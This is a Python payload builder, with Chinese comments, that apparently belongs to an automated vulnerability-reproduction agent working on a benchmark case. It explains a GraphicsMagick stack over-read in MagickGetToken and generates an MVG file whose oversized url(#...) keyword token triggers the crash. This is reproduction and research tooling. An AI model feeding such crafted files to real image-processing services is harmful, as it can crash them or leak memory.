"""CG-23（arvo:10653 / GraphicsMagick）MVG 关键字 token 构造器。

**缺陷**：magick/utility.c 的 MagickGetToken() 末尾：

    if ((LocaleNCompare(token,"url(#",5) == 0) && ((r = strrchr(token,')')) != NULL)) {
        *r='\0';
        (void) memmove(token,token+5,r-token+1);   /* 应该是 r-token-4 */
    }

拷贝长度按 r-token+1 算，源指针却是 token+5，于是从 token+5 起读 L 字节
（L = 原 token 长度），末尾多读 4 字节 —— 官方报的是 READ of size 2049，
stack-buffer-overflow，栈帧 __asan_memmove → MagickGetToken utility.c:3830
→ DrawImage render.c:2467。

**触发形（实测得到，不是从描述推的）**：
- url(#…) 必须出现在**图元关键字**位置（MVG 每行第一个 token），
  而不是 fill 'url(#…)' 这种参数位置 —— 参数位置走另一条 token 路径，不崩；
- token 长度要 >= 2049（MaxTextExtent=2053，读越界 4 字节的窗口是 2049-2052）。

实测（n132/arvo:10653-vul）：2045/2048 不崩，2049/2050/2051/2052 全部 READ of size 2049。
"""
from __future__ import annotations

MIN_TOKEN = 2049          # 低于它读不到缓冲区外
MAX_TOKEN = 2052          # 再长会被 MaxTextExtent 截断，反而拿不到结尾的 ")"
DEFAULT_TOKEN = 2049

FIELDS = {
    "token_len": "int(2049..2052), url(#…) 整体长度（默认 2049）",
    "tail": "str, 关键字之后补的文本（默认空）",
    "fill": "str, payload 里的填充字符（默认 A）",
}

DECLARED_SINK = {
    "file": "magick/utility.c",
    "line": 3830,
    "symbol": "memmove",
    "note": "memmove(token,token+5,r-token+1) 从 token+5 起读 L 字节，末尾多读 4 字节",
}


class GmTokenResult:
    """构造结果（普通类：模块可能按文件路径加载）。"""

    def __init__(self, ok, data=b"", fields_used=None, dropped=None, reason=""):
        self.ok = ok
        self.data = data
        self.format = "gm_token"
        self.fields_used = dict(fields_used or {})
        self.dropped = list(dropped or [])
        self.reason = reason

    @property
    def size(self) -> int:
        return len(self.data)

    def to_record(self) -> dict:
        return {"ok": self.ok, "format": self.format, "size": self.size,
                "fields_used": self.fields_used, "dropped_fields": self.dropped,
                "reason": self.reason}


def build(fields: dict) -> GmTokenResult:
    fields = dict(fields or {})
    try:
        token_len = int(fields.get("token_len", DEFAULT_TOKEN))
    except (TypeError, ValueError):
        return GmTokenResult(False, reason="token_len 必须是整数")
    if not MIN_TOKEN <= token_len <= MAX_TOKEN:
        return GmTokenResult(False, reason=f"token_len 越界（{MIN_TOKEN}..{MAX_TOKEN}）: {token_len}")
    ch = str(fields.get("fill") or "A")[:1] or "A"
    tail = str(fields.get("tail") or "")
    body = token_len - len("url(#") - 1        # 留出 "url(#" 与结尾 ")"
    payload = "url(#" + ch * body + ")"
    if len(payload) != token_len:              # 防御：字符数不匹配就别造
        return GmTokenResult(False, reason=f"payload 长度异常: {len(payload)} != {token_len}")
    text = ("push graphic-context\n"
            "viewbox 0 0 100 100\n"
            f"{payload}{tail}\n"
            "pop graphic-context\n")
    used = {"token_len": token_len, "fill": ch, "tail": tail, "bytes": len(text)}
    known = set(FIELDS)
    dropped = [{"field": k, "reason": "gm_token 构造器不识别该字段"}
               for k in fields if k not in known]
    return GmTokenResult(True, text.encode("latin-1"), used, dropped, "")


def declared_claim() -> dict:
    """构造器自带主张：MagickGetToken 里 memmove 多读 4 字节。"""
    return {
        "claim_id": "cg23-gm-token-url",
        "subject": "MagickGetToken",
        "proposed_by": "builder",
        "subject_source": "builder",
        "evidence_source": "agent/builders/gm_token.py + arvo error.txt",
        "cwe": "CWE-125",
        "sink": dict(DECLARED_SINK),
        "test_plan": {"format": "gm_token"},
    }


def fields_spec() -> dict:
    return dict(FIELDS)


if __name__ == "__main__":
    r = build({})
    assert r.ok, r.reason
    assert r.fields_used["token_len"] == 2049
    assert not build({"token_len": 2048}).ok
    assert not build({"token_len": 2053}).ok
    assert build({"token_len": 2052}).ok
    assert build({"unknown": 1}).dropped
    c = declared_claim()
    assert c["subject"] == "MagickGetToken" and c["sink"]["line"] == 3830
    print("gm_token builder self-check OK:", r.to_record())
